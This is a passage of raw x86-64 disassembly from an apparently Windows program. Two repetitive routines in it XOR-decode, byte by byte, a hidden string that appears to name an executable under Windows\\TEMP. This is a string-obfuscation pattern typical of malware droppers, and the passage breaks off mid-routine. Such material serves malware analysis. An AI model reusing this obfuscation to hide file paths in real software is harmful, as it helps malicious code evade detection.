   14000168a:	0f 
   14000168b:	b8 03 00 00 00       	mov    $0x3,%eax
   140001690:	4c 0f 47 05 50 57 02 	cmova  0x25750(%rip),%r8        # 0x140026de8
   140001697:	00 
   140001698:	33 d2                	xor    %edx,%edx
   14000169a:	48 f7 f1             	div    %rcx
   14000169d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400016a2:	34 57                	xor    $0x57,%al
   1400016a4:	41 88 40 03          	mov    %al,0x3(%r8)
   1400016a8:	4c 8b c3             	mov    %rbx,%r8
   1400016ab:	48 83 3d 4d 57 02 00 	cmpq   $0xf,0x2574d(%rip)        # 0x140026e00
   1400016b2:	0f 
   1400016b3:	b8 04 00 00 00       	mov    $0x4,%eax
   1400016b8:	4c 0f 47 05 28 57 02 	cmova  0x25728(%rip),%r8        # 0x140026de8
   1400016bf:	00 
   1400016c0:	33 d2                	xor    %edx,%edx
   1400016c2:	48 f7 f1             	div    %rcx
   1400016c5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400016ca:	34 69                	xor    $0x69,%al
   1400016cc:	41 88 40 04          	mov    %al,0x4(%r8)
   1400016d0:	4c 8b c3             	mov    %rbx,%r8
   1400016d3:	48 83 3d 25 57 02 00 	cmpq   $0xf,0x25725(%rip)        # 0x140026e00
   1400016da:	0f 
   1400016db:	b8 05 00 00 00       	mov    $0x5,%eax
   1400016e0:	4c 0f 47 05 00 57 02 	cmova  0x25700(%rip),%r8        # 0x140026de8
   1400016e7:	00 
   1400016e8:	33 d2                	xor    %edx,%edx
   1400016ea:	48 f7 f1             	div    %rcx
   1400016ed:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400016f2:	34 6e                	xor    $0x6e,%al
   1400016f4:	41 88 40 05          	mov    %al,0x5(%r8)
   1400016f8:	4c 8b c3             	mov    %rbx,%r8
   1400016fb:	48 83 3d fd 56 02 00 	cmpq   $0xf,0x256fd(%rip)        # 0x140026e00
   140001702:	0f 
   140001703:	b8 06 00 00 00       	mov    $0x6,%eax
   140001708:	4c 0f 47 05 d8 56 02 	cmova  0x256d8(%rip),%r8        # 0x140026de8
   14000170f:	00 
   140001710:	33 d2                	xor    %edx,%edx
   140001712:	48 f7 f1             	div    %rcx
   140001715:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000171a:	34 64                	xor    $0x64,%al
   14000171c:	41 88 40 06          	mov    %al,0x6(%r8)
   140001720:	4c 8b c3             	mov    %rbx,%r8
   140001723:	48 83 3d d5 56 02 00 	cmpq   $0xf,0x256d5(%rip)        # 0x140026e00
   14000172a:	0f 
   14000172b:	b8 07 00 00 00       	mov    $0x7,%eax
   140001730:	4c 0f 47 05 b0 56 02 	cmova  0x256b0(%rip),%r8        # 0x140026de8
   140001737:	00 
   140001738:	33 d2                	xor    %edx,%edx
   14000173a:	48 f7 f1             	div    %rcx
   14000173d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001742:	34 6f                	xor    $0x6f,%al
   140001744:	41 88 40 07          	mov    %al,0x7(%r8)
   140001748:	4c 8b c3             	mov    %rbx,%r8
   14000174b:	48 83 3d ad 56 02 00 	cmpq   $0xf,0x256ad(%rip)        # 0x140026e00
   140001752:	0f 
   140001753:	b8 08 00 00 00       	mov    $0x8,%eax
   140001758:	4c 0f 47 05 88 56 02 	cmova  0x25688(%rip),%r8        # 0x140026de8
   14000175f:	00 
   140001760:	33 d2                	xor    %edx,%edx
   140001762:	48 f7 f1             	div    %rcx
   140001765:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000176a:	34 77                	xor    $0x77,%al
   14000176c:	41 88 40 08          	mov    %al,0x8(%r8)
   140001770:	4c 8b c3             	mov    %rbx,%r8
   140001773:	48 83 3d 85 56 02 00 	cmpq   $0xf,0x25685(%rip)        # 0x140026e00
   14000177a:	0f 
   14000177b:	b8 09 00 00 00       	mov    $0x9,%eax
   140001780:	4c 0f 47 05 60 56 02 	cmova  0x25660(%rip),%r8        # 0x140026de8
   140001787:	00 
   140001788:	33 d2                	xor    %edx,%edx
   14000178a:	48 f7 f1             	div    %rcx
   14000178d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001792:	34 73                	xor    $0x73,%al
   140001794:	41 88 40 09          	mov    %al,0x9(%r8)
   140001798:	4c 8b c3             	mov    %rbx,%r8
   14000179b:	48 83 3d 5d 56 02 00 	cmpq   $0xf,0x2565d(%rip)        # 0x140026e00
   1400017a2:	0f 
   1400017a3:	b8 0a 00 00 00       	mov    $0xa,%eax
   1400017a8:	4c 0f 47 05 38 56 02 	cmova  0x25638(%rip),%r8        # 0x140026de8
   1400017af:	00 
   1400017b0:	33 d2                	xor    %edx,%edx
   1400017b2:	48 f7 f1             	div    %rcx
   1400017b5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400017ba:	34 5c                	xor    $0x5c,%al
   1400017bc:	41 88 40 0a          	mov    %al,0xa(%r8)
   1400017c0:	4c 8b c3             	mov    %rbx,%r8
   1400017c3:	48 83 3d 35 56 02 00 	cmpq   $0xf,0x25635(%rip)        # 0x140026e00
   1400017ca:	0f 
   1400017cb:	b8 0b 00 00 00       	mov    $0xb,%eax
   1400017d0:	4c 0f 47 05 10 56 02 	cmova  0x25610(%rip),%r8        # 0x140026de8
   1400017d7:	00 
   1400017d8:	33 d2                	xor    %edx,%edx
   1400017da:	48 f7 f1             	div    %rcx
   1400017dd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400017e2:	34 54                	xor    $0x54,%al
   1400017e4:	41 88 40 0b          	mov    %al,0xb(%r8)
   1400017e8:	4c 8b c3             	mov    %rbx,%r8
   1400017eb:	48 83 3d 0d 56 02 00 	cmpq   $0xf,0x2560d(%rip)        # 0x140026e00
   1400017f2:	0f 
   1400017f3:	b8 0c 00 00 00       	mov    $0xc,%eax
   1400017f8:	4c 0f 47 05 e8 55 02 	cmova  0x255e8(%rip),%r8        # 0x140026de8
   1400017ff:	00 
   140001800:	33 d2                	xor    %edx,%edx
   140001802:	48 f7 f1             	div    %rcx
   140001805:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000180a:	34 45                	xor    $0x45,%al
   14000180c:	41 88 40 0c          	mov    %al,0xc(%r8)
   140001810:	4c 8b c3             	mov    %rbx,%r8
   140001813:	48 83 3d e5 55 02 00 	cmpq   $0xf,0x255e5(%rip)        # 0x140026e00
   14000181a:	0f 
   14000181b:	b8 0d 00 00 00       	mov    $0xd,%eax
   140001820:	4c 0f 47 05 c0 55 02 	cmova  0x255c0(%rip),%r8        # 0x140026de8
   140001827:	00 
   140001828:	33 d2                	xor    %edx,%edx
   14000182a:	48 f7 f1             	div    %rcx
   14000182d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001832:	34 4d                	xor    $0x4d,%al
   140001834:	41 88 40 0d          	mov    %al,0xd(%r8)
   140001838:	4c 8b c3             	mov    %rbx,%r8
   14000183b:	48 83 3d bd 55 02 00 	cmpq   $0xf,0x255bd(%rip)        # 0x140026e00
   140001842:	0f 
   140001843:	b8 0e 00 00 00       	mov    $0xe,%eax
   140001848:	4c 0f 47 05 98 55 02 	cmova  0x25598(%rip),%r8        # 0x140026de8
   14000184f:	00 
   140001850:	33 d2                	xor    %edx,%edx
   140001852:	48 f7 f1             	div    %rcx
   140001855:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000185a:	34 50                	xor    $0x50,%al
   14000185c:	41 88 40 0e          	mov    %al,0xe(%r8)
   140001860:	4c 8b c3             	mov    %rbx,%r8
   140001863:	48 83 3d 95 55 02 00 	cmpq   $0xf,0x25595(%rip)        # 0x140026e00
   14000186a:	0f 
   14000186b:	b8 0f 00 00 00       	mov    $0xf,%eax
   140001870:	4c 0f 47 05 70 55 02 	cmova  0x25570(%rip),%r8        # 0x140026de8
   140001877:	00 
   140001878:	33 d2                	xor    %edx,%edx
   14000187a:	48 f7 f1             	div    %rcx
   14000187d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001882:	34 5c                	xor    $0x5c,%al
   140001884:	41 88 40 0f          	mov    %al,0xf(%r8)
   140001888:	4c 8b c3             	mov    %rbx,%r8
   14000188b:	48 83 3d 6d 55 02 00 	cmpq   $0xf,0x2556d(%rip)        # 0x140026e00
   140001892:	0f 
   140001893:	b8 10 00 00 00       	mov    $0x10,%eax
   140001898:	4c 0f 47 05 48 55 02 	cmova  0x25548(%rip),%r8        # 0x140026de8
   14000189f:	00 
   1400018a0:	33 d2                	xor    %edx,%edx
   1400018a2:	48 f7 f1             	div    %rcx
   1400018a5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400018aa:	34 67                	xor    $0x67,%al
   1400018ac:	41 88 40 10          	mov    %al,0x10(%r8)
   1400018b0:	4c 8b c3             	mov    %rbx,%r8
   1400018b3:	48 83 3d 45 55 02 00 	cmpq   $0xf,0x25545(%rip)        # 0x140026e00
   1400018ba:	0f 
   1400018bb:	b8 11 00 00 00       	mov    $0x11,%eax
   1400018c0:	4c 0f 47 05 20 55 02 	cmova  0x25520(%rip),%r8        # 0x140026de8
   1400018c7:	00 
   1400018c8:	33 d2                	xor    %edx,%edx
   1400018ca:	48 f7 f1             	div    %rcx
   1400018cd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400018d2:	34 69                	xor    $0x69,%al
   1400018d4:	41 88 40 11          	mov    %al,0x11(%r8)
   1400018d8:	4c 8b c3             	mov    %rbx,%r8
   1400018db:	48 83 3d 1d 55 02 00 	cmpq   $0xf,0x2551d(%rip)        # 0x140026e00
   1400018e2:	0f 
   1400018e3:	b8 12 00 00 00       	mov    $0x12,%eax
   1400018e8:	4c 0f 47 05 f8 54 02 	cmova  0x254f8(%rip),%r8        # 0x140026de8
   1400018ef:	00 
   1400018f0:	33 d2                	xor    %edx,%edx
   1400018f2:	48 f7 f1             	div    %rcx
   1400018f5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400018fa:	34 61                	xor    $0x61,%al
   1400018fc:	41 88 40 12          	mov    %al,0x12(%r8)
   140001900:	4c 8b c3             	mov    %rbx,%r8
   140001903:	48 83 3d f5 54 02 00 	cmpq   $0xf,0x254f5(%rip)        # 0x140026e00
   14000190a:	0f 
   14000190b:	b8 13 00 00 00       	mov    $0x13,%eax
   140001910:	4c 0f 47 05 d0 54 02 	cmova  0x254d0(%rip),%r8        # 0x140026de8
   140001917:	00 
   140001918:	33 d2                	xor    %edx,%edx
   14000191a:	48 f7 f1             	div    %rcx
   14000191d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001922:	34 6e                	xor    $0x6e,%al
   140001924:	41 88 40 13          	mov    %al,0x13(%r8)
   140001928:	4c 8b c3             	mov    %rbx,%r8
   14000192b:	48 83 3d cd 54 02 00 	cmpq   $0xf,0x254cd(%rip)        # 0x140026e00
   140001932:	0f 
   140001933:	b8 14 00 00 00       	mov    $0x14,%eax
   140001938:	4c 0f 47 05 a8 54 02 	cmova  0x254a8(%rip),%r8        # 0x140026de8
   14000193f:	00 
   140001940:	33 d2                	xor    %edx,%edx
   140001942:	48 f7 f1             	div    %rcx
   140001945:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000194a:	34 6e                	xor    $0x6e,%al
   14000194c:	41 88 40 14          	mov    %al,0x14(%r8)
   140001950:	4c 8b c3             	mov    %rbx,%r8
   140001953:	48 83 3d a5 54 02 00 	cmpq   $0xf,0x254a5(%rip)        # 0x140026e00
   14000195a:	0f 
   14000195b:	b8 15 00 00 00       	mov    $0x15,%eax
   140001960:	4c 0f 47 05 80 54 02 	cmova  0x25480(%rip),%r8        # 0x140026de8
   140001967:	00 
   140001968:	33 d2                	xor    %edx,%edx
   14000196a:	48 f7 f1             	div    %rcx
   14000196d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001972:	34 69                	xor    $0x69,%al
   140001974:	41 88 40 15          	mov    %al,0x15(%r8)
   140001978:	4c 8b c3             	mov    %rbx,%r8
   14000197b:	48 83 3d 7d 54 02 00 	cmpq   $0xf,0x2547d(%rip)        # 0x140026e00
   140001982:	0f 
   140001983:	b8 16 00 00 00       	mov    $0x16,%eax
   140001988:	4c 0f 47 05 58 54 02 	cmova  0x25458(%rip),%r8        # 0x140026de8
   14000198f:	00 
   140001990:	33 d2                	xor    %edx,%edx
   140001992:	48 f7 f1             	div    %rcx
   140001995:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000199a:	34 30                	xor    $0x30,%al
   14000199c:	41 88 40 16          	mov    %al,0x16(%r8)
   1400019a0:	4c 8b c3             	mov    %rbx,%r8
   1400019a3:	48 83 3d 55 54 02 00 	cmpq   $0xf,0x25455(%rip)        # 0x140026e00
   1400019aa:	0f 
   1400019ab:	b8 17 00 00 00       	mov    $0x17,%eax
   1400019b0:	4c 0f 47 05 30 54 02 	cmova  0x25430(%rip),%r8        # 0x140026de8
   1400019b7:	00 
   1400019b8:	33 d2                	xor    %edx,%edx
   1400019ba:	48 f7 f1             	div    %rcx
   1400019bd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400019c2:	34 2e                	xor    $0x2e,%al
   1400019c4:	41 88 40 17          	mov    %al,0x17(%r8)
   1400019c8:	4c 8b c3             	mov    %rbx,%r8
   1400019cb:	48 83 3d 2d 54 02 00 	cmpq   $0xf,0x2542d(%rip)        # 0x140026e00
   1400019d2:	0f 
   1400019d3:	b8 18 00 00 00       	mov    $0x18,%eax
   1400019d8:	4c 0f 47 05 08 54 02 	cmova  0x25408(%rip),%r8        # 0x140026de8
   1400019df:	00 
   1400019e0:	33 d2                	xor    %edx,%edx
   1400019e2:	48 f7 f1             	div    %rcx
   1400019e5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400019ea:	34 65                	xor    $0x65,%al
   1400019ec:	41 88 40 18          	mov    %al,0x18(%r8)
   1400019f0:	4c 8b c3             	mov    %rbx,%r8
   1400019f3:	48 83 3d 05 54 02 00 	cmpq   $0xf,0x25405(%rip)        # 0x140026e00
   1400019fa:	0f 
   1400019fb:	b8 19 00 00 00       	mov    $0x19,%eax
   140001a00:	4c 0f 47 05 e0 53 02 	cmova  0x253e0(%rip),%r8        # 0x140026de8
   140001a07:	00 
   140001a08:	33 d2                	xor    %edx,%edx
   140001a0a:	48 f7 f1             	div    %rcx
   140001a0d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001a12:	34 78                	xor    $0x78,%al
   140001a14:	41 88 40 19          	mov    %al,0x19(%r8)
   140001a18:	4c 8b c3             	mov    %rbx,%r8
   140001a1b:	48 83 3d dd 53 02 00 	cmpq   $0xf,0x253dd(%rip)        # 0x140026e00
   140001a22:	0f 
   140001a23:	b8 1a 00 00 00       	mov    $0x1a,%eax
   140001a28:	4c 0f 47 05 b8 53 02 	cmova  0x253b8(%rip),%r8        # 0x140026de8
   140001a2f:	00 
   140001a30:	33 d2                	xor    %edx,%edx
   140001a32:	48 f7 f1             	div    %rcx
   140001a35:	48 8b c3             	mov    %rbx,%rax
   140001a38:	42 0f b6 0c 0a       	movzbl (%rdx,%r9,1),%ecx
   140001a3d:	80 f1 65             	xor    $0x65,%cl
   140001a40:	41 88 48 1a          	mov    %cl,0x1a(%r8)
   140001a44:	48 83 c4 30          	add    $0x30,%rsp
   140001a48:	5b                   	pop    %rbx
   140001a49:	c3                   	ret
   140001a4a:	cc                   	int3
   140001a4b:	cc                   	int3
   140001a4c:	cc                   	int3
   140001a4d:	cc                   	int3
   140001a4e:	cc                   	int3
   140001a4f:	cc                   	int3
   140001a50:	40 53                	rex push %rbx
   140001a52:	48 83 ec 30          	sub    $0x30,%rsp
   140001a56:	48 8d 1d 2b 54 02 00 	lea    0x2542b(%rip),%rbx        # 0x140026e88
   140001a5d:	ba 1b 00 00 00       	mov    $0x1b,%edx
   140001a62:	48 8b cb             	mov    %rbx,%rcx
   140001a65:	e8 a6 48 00 00       	call   0x140006310
   140001a6a:	4c 8d 0d 5f ce 00 00 	lea    0xce5f(%rip),%r9        # 0x14000e8d0
   140001a71:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140001a78:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140001a7f:	00 
   140001a80:	48 ff c1             	inc    %rcx
   140001a83:	41 80 3c 09 00       	cmpb   $0x0,(%r9,%rcx,1)
   140001a88:	75 f6                	jne    0x140001a80
   140001a8a:	48 83 3d 0e 54 02 00 	cmpq   $0xf,0x2540e(%rip)        # 0x140026ea0
   140001a91:	0f 
   140001a92:	48 8b c3             	mov    %rbx,%rax
   140001a95:	4c 8b c3             	mov    %rbx,%r8
   140001a98:	48 0f 47 05 e8 53 02 	cmova  0x253e8(%rip),%rax        # 0x140026e88
   140001a9f:	00 
   140001aa0:	c6 00 25             	movb   $0x25,(%rax)
   140001aa3:	b8 01 00 00 00       	mov    $0x1,%eax
   140001aa8:	48 83 3d f0 53 02 00 	cmpq   $0xf,0x253f0(%rip)        # 0x140026ea0
   140001aaf:	0f 
   140001ab0:	4c 0f 47 05 d0 53 02 	cmova  0x253d0(%rip),%r8        # 0x140026e88
   140001ab7:	00 
   140001ab8:	33 d2                	xor    %edx,%edx
   140001aba:	48 f7 f1             	div    %rcx
   140001abd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001ac2:	34 3a                	xor    $0x3a,%al
   140001ac4:	41 88 40 01          	mov    %al,0x1(%r8)
   140001ac8:	4c 8b c3             	mov    %rbx,%r8
   140001acb:	48 83 3d cd 53 02 00 	cmpq   $0xf,0x253cd(%rip)        # 0x140026ea0
   140001ad2:	0f 
   140001ad3:	b8 02 00 00 00       	mov    $0x2,%eax
   140001ad8:	4c 0f 47 05 a8 53 02 	cmova  0x253a8(%rip),%r8        # 0x140026e88
   140001adf:	00 
   140001ae0:	33 d2                	xor    %edx,%edx
   140001ae2:	48 f7 f1             	div    %rcx
   140001ae5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001aea:	34 5c                	xor    $0x5c,%al
   140001aec:	41 88 40 02          	mov    %al,0x2(%r8)
   140001af0:	4c 8b c3             	mov    %rbx,%r8
   140001af3:	48 83 3d a5 53 02 00 	cmpq   $0xf,0x253a5(%rip)        # 0x140026ea0
   140001afa:	0f 
   140001afb:	b8 03 00 00 00       	mov    $0x3,%eax
   140001b00:	4c 0f 47 05 80 53 02 	cmova  0x25380(%rip),%r8        # 0x140026e88
   140001b07:	00 
   140001b08:	33 d2                	xor    %edx,%edx
   140001b0a:	48 f7 f1             	div    %rcx
   140001b0d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001b12:	34 57                	xor    $0x57,%al
   140001b14:	41 88 40 03          	mov    %al,0x3(%r8)
   140001b18:	4c 8b c3             	mov    %rbx,%r8
   140001b1b:	48 83 3d 7d 53 02 00 	cmpq   $0xf,0x2537d(%rip)        # 0x140026ea0
   140001b22:	0f 
   140001b23:	b8 04 00 00 00       	mov    $0x4,%eax
   140001b28:	4c 0f 47 05 58 53 02 	cmova  0x25358(%rip),%r8        # 0x140026e88
   140001b2f:	00 
   140001b30:	33 d2                	xor    %edx,%edx
   140001b32:	48 f7 f1             	div    %rcx
   140001b35:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001b3a:	34 69                	xor    $0x69,%al
   140001b3c:	41 88 40 04          	mov    %al,0x4(%r8)
   140001b40:	4c 8b c3             	mov    %rbx,%r8
   140001b43:	48 83 3d 55 53 02 00 	cmpq   $0xf,0x25355(%rip)        # 0x140026ea0
   140001b4a:	0f 
   140001b4b:	b8 05 00 00 00       	mov    $0x5,%eax
   140001b50:	4c 0f 47 05 30 53 02 	cmova  0x25330(%rip),%r8        # 0x140026e88
   140001b57:	00 
   140001b58:	33 d2                	xor    %edx,%edx
   140001b5a:	48 f7 f1             	div    %rcx
   140001b5d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001b62:	34 6e                	xor    $0x6e,%al
   140001b64:	41 88 40 05          	mov    %al,0x5(%r8)
   140001b68:	4c 8b c3             	mov    %rbx,%r8
   140001b6b:	48 83 3d 2d 53 02 00 	cmpq   $0xf,0x2532d(%rip)        # 0x140026ea0
   140001b72:	0f 
   140001b73:	b8 06 00 00 00       	mov    $0x6,%eax
   140001b78:	4c 0f 47 05 08 53 02 	cmova  0x25308(%rip),%r8        # 0x140026e88
   140001b7f:	00 
   140001b80:	33 d2                	xor    %edx,%edx
   140001b82:	48 f7 f1             	div    %rcx
   140001b85:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001b8a:	34 64                	xor    $0x64,%al
   140001b8c:	41 88 40 06          	mov    %al,0x6(%r8)
   140001b90:	4c 8b c3             	mov    %rbx,%r8
   140001b93:	48 83 3d 05 53 02 00 	cmpq   $0xf,0x25305(%rip)        # 0x140026ea0
   140001b9a:	0f 
   140001b9b:	b8 07 00 00 00       	mov    $0x7,%eax
   140001ba0:	4c 0f 47 05 e0 52 02 	cmova  0x252e0(%rip),%r8        # 0x140026e88
   140001ba7:	00 
   140001ba8:	33 d2                	xor    %edx,%edx
   140001baa:	48 f7 f1             	div    %rcx
   140001bad:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001bb2:	34 6f                	xor    $0x6f,%al
   140001bb4:	41 88 40 07          	mov    %al,0x7(%r8)
   140001bb8:	4c 8b c3             	mov    %rbx,%r8
   140001bbb:	48 83 3d dd 52 02 00 	cmpq   $0xf,0x252dd(%rip)        # 0x140026ea0
   140001bc2:	0f 
   140001bc3:	b8 08 00 00 00       	mov    $0x8,%eax
   140001bc8:	4c 0f 47 05 b8 52 02 	cmova  0x252b8(%rip),%r8        # 0x140026e88
   140001bcf:	00 
   140001bd0:	33 d2                	xor    %edx,%edx
   140001bd2:	48 f7 f1             	div    %rcx
   140001bd5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001bda:	34 77                	xor    $0x77,%al
   140001bdc:	41 88 40 08          	mov    %al,0x8(%r8)
   140001be0:	4c 8b c3             	mov    %rbx,%r8
   140001be3:	48 83 3d b5 52 02 00 	cmpq   $0xf,0x252b5(%rip)        # 0x140026ea0
   140001bea:	0f 
   140001beb:	b8 09 00 00 00       	mov    $0x9,%eax
   140001bf0:	4c 0f 47 05 90 52 02 	cmova  0x25290(%rip),%r8        # 0x140026e88
   140001bf7:	00 
   140001bf8:	33 d2                	xor    %edx,%edx
   140001bfa:	48 f7 f1             	div    %rcx
   140001bfd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001c02:	34 73                	xor    $0x73,%al
   140001c04:	41 88 40 09          	mov    %al,0x9(%r8)
   140001c08:	4c 8b c3             	mov    %rbx,%r8
   140001c0b:	48 83 3d 8d 52 02 00 	cmpq   $0xf,0x2528d(%rip)        # 0x140026ea0
   140001c12:	0f 
   140001c13:	b8 0a 00 00 00       	mov    $0xa,%eax
   140001c18:	4c 0f 47 05 68 52 02 	cmova  0x25268(%rip),%r8        # 0x140026e88
   140001c1f:	00 
   140001c20:	33 d2                	xor    %edx,%edx
   140001c22:	48 f7 f1             	div    %rcx
   140001c25:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001c2a:	34 5c                	xor    $0x5c,%al
   140001c2c:	41 88 40 0a          	mov    %al,0xa(%r8)
   140001c30:	4c 8b c3             	mov    %rbx,%r8
   140001c33:	48 83 3d 65 52 02 00 	cmpq   $0xf,0x25265(%rip)        # 0x140026ea0
   140001c3a:	0f 
   140001c3b:	b8 0b 00 00 00       	mov    $0xb,%eax
   140001c40:	4c 0f 47 05 40 52 02 	cmova  0x25240(%rip),%r8        # 0x140026e88
   140001c47:	00 
   140001c48:	33 d2                	xor    %edx,%edx
   140001c4a:	48 f7 f1             	div    %rcx
   140001c4d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001c52:	34 54                	xor    $0x54,%al
   140001c54:	41 88 40 0b          	mov    %al,0xb(%r8)
   140001c58:	4c 8b c3             	mov    %rbx,%r8
   140001c5b:	48 83 3d 3d 52 02 00 	cmpq   $0xf,0x2523d(%rip)        # 0x140026ea0
   140001c62:	0f 
   140001c63:	b8 0c 00 00 00       	mov    $0xc,%eax
   140001c68:	4c 0f 47 05 18 52 02 	cmova  0x25218(%rip),%r8        # 0x140026e88
   140001c6f:	00 
   140001c70:	33 d2                	xor    %edx,%edx
   140001c72:	48 f7 f1             	div    %rcx
   140001c75:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001c7a:	34 45                	xor    $0x45,%al
   140001c7c:	41 88 40 0c          	mov    %al,0xc(%r8)
   140001c80:	4c 8b c3             	mov    %rbx,%r8
   140001c83:	48 83 3d 15 52 02 00 	cmpq   $0xf,0x25215(%rip)        # 0x140026ea0
   140001c8a:	0f 
   140001c8b:	b8 0d 00 00 00       	mov    $0xd,%eax
   140001c90:	4c 0f 47 05 f0 51 02 	cmova  0x251f0(%rip),%r8        # 0x140026e88
   140001c97:	00 
   140001c98:	33 d2                	xor    %edx,%edx
   140001c9a:	48 f7 f1             	div    %rcx
   140001c9d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001ca2:	34 4d                	xor    $0x4d,%al
   140001ca4:	41 88 40 0d          	mov    %al,0xd(%r8)
   140001ca8:	4c 8b c3             	mov    %rbx,%r8
   140001cab:	48 83 3d ed 51 02 00 	cmpq   $0xf,0x251ed(%rip)        # 0x140026ea0
   140001cb2:	0f 
   140001cb3:	b8 0e 00 00 00       	mov    $0xe,%eax
   140001cb8:	4c 0f 47 05 c8 51 02 	cmova  0x251c8(%rip),%r8        # 0x140026e88
   140001cbf:	00 
   140001cc0:	33 d2                	xor    %edx,%edx
   140001cc2:	48 f7 f1             	div    %rcx
   140001cc5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001cca:	34 50                	xor    $0x50,%al
   140001ccc:	41 88 40 0e          	mov    %al,0xe(%r8)
   140001cd0:	4c 8b c3             	mov    %rbx,%r8
   140001cd3:	48 83 3d c5 51 02 00 	cmpq   $0xf,0x251c5(%rip)        # 0x140026ea0
   140001cda:	0f 
   140001cdb:	b8 0f 00 00 00       	mov    $0xf,%eax
   140001ce0:	4c 0f 47 05 a0 51 02 	cmova  0x251a0(%rip),%r8        # 0x140026e88
   140001ce7:	00 
   140001ce8:	33 d2                	xor    %edx,%edx
   140001cea:	48 f7 f1             	div    %rcx
   140001ced:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001cf2:	34 5c                	xor    $0x5c,%al
   140001cf4:	41 88 40 0f          	mov    %al,0xf(%r8)
   140001cf8:	4c 8b c3             	mov    %rbx,%r8
   140001cfb:	48 83 3d 9d 51 02 00 	cmpq   $0xf,0x2519d(%rip)        # 0x140026ea0
   140001d02:	0f 
   140001d03:	b8 10 00 00 00       	mov    $0x10,%eax
   140001d08:	4c 0f 47 05 78 51 02 	cmova  0x25178(%rip),%r8        # 0x140026e88
   140001d0f:	00 
   140001d10:	33 d2                	xor    %edx,%edx
   140001d12:	48 f7 f1             	div    %rcx
   140001d15:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001d1a:	34 67                	xor    $0x67,%al
   140001d1c:	41 88 40 10          	mov    %al,0x10(%r8)
   140001d20:	4c 8b c3             	mov    %rbx,%r8
   140001d23:	48 83 3d 75 51 02 00 	cmpq   $0xf,0x25175(%rip)        # 0x140026ea0
   140001d2a:	0f 
   140001d2b:	b8 11 00 00 00       	mov    $0x11,%eax
   140001d30:	4c 0f 47 05 50 51 02 	cmova  0x25150(%rip),%r8        # 0x140026e88
   140001d37:	00 
   140001d38:	33 d2                	xor    %edx,%edx
   140001d3a:	48 f7 f1             	div    %rcx
   140001d3d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001d42:	34 69                	xor    $0x69,%al
   140001d44:	41 88 40 11          	mov    %al,0x11(%r8)
   140001d48:	4c 8b c3             	mov    %rbx,%r8
   140001d4b:	48 83 3d 4d 51 02 00 	cmpq   $0xf,0x2514d(%rip)        # 0x140026ea0
   140001d52:	0f 
   140001d53:	b8 12 00 00 00       	mov    $0x12,%eax
   140001d58:	4c 0f 47 05 28 51 02 	cmova  0x25128(%rip),%r8        # 0x140026e88
   140001d5f:	00 
   140001d60:	33 d2                	xor    %edx,%edx
   140001d62:	48 f7 f1             	div    %rcx
   140001d65:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001d6a:	34 61                	xor    $0x61,%al
   140001d6c:	41 88 40 12          	mov    %al,0x12(%r8)
   140001d70:	4c 8b c3             	mov    %rbx,%r8
   140001d73:	48 83 3d 25 51 02 00 	cmpq   $0xf,0x25125(%rip)        # 0x140026ea0
   140001d7a:	0f 
   140001d7b:	b8 13 00 00 00       	mov    $0x13,%eax
   140001d80:	4c 0f 47 05 00 51 02 	cmova  0x25100(%rip),%r8        # 0x140026e88
   140001d87:	00 
   140001d88:	33 d2                	xor    %edx,%edx
   140001d8a:	48 f7 f1             	div    %rcx
   140001d8d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001d92:	34 6e                	xor    $0x6e,%al
   140001d94:	41 88 40 13          	mov    %al,0x13(%r8)
   140001d98:	4c 8b c3             	mov    %rbx,%r8
   140001d9b:	48 83 3d fd 50 02 00 	cmpq   $0xf,0x250fd(%rip)        # 0x140026ea0
   140001da2:	0f 
